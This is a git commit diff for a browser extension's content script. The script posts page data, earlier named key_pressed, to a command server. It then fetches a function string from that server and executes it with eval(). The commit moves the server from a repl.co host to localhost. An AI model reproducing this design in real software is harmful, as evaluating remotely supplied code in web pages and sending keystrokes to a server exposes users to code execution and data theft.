026cbf1cde9f3ae4f1d9ac169b4434eccd84400a
Prakshal Pro <prakshal@Prakshals-MacBook-Pro.local>
2022-05-23 05:05:34 -0400

    saved to localstorage

--- extension/content.js
+++ extension/content.js
@@ -1,19 +1,21 @@
 // Some useless comment
+localStorage.setItem("draco_function_index", 0);
 
 const sendData = async (data) => {
-    await fetch(`https://draco.maalolan.repl.co/command`, {
+    console.log("happened")
+    await fetch(`http://localhost:3000/command`, {
         method: 'POST', // or 'PUT'
         headers: {
             'Accept': 'application/json',
             'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ key_pressed: data }),
+        body: JSON.stringify({ data: data }),
     })
 }
 
 
 const getCommand = async () => {
-    await fetch('https://draco.maalolan.repl.co/command', {
+    await fetch('http://localhost:3000/command', {
         headers: {
             'Accept': 'application/json',
             'Content-Type': 'application/json',
@@ -23,8 +25,26 @@ const getCommand = async () => {
         .then(data => {
             const func = eval(data.function);
             func()
+
+            // const idx = parseInt(data.index)
+            // if (idx === parseInt(localStorage.getItem("draco_function_index"))) {
+            //     return
+            // }
+            // else {
+            //     localStorage.setItem("draco_function_index", idx);
+
+            //     if (idx === parseInt(localStorage.getItem("draco_function_index"))) {
+            //         return
+            //     }
+            //     // location.reload()
+            // }
         })
         .catch(err => console.log(err))
 }
 
+
+// setInterval(getCommand, 1000)
 getCommand()
+
+
+// https://draco.maalolan.repl.co/command
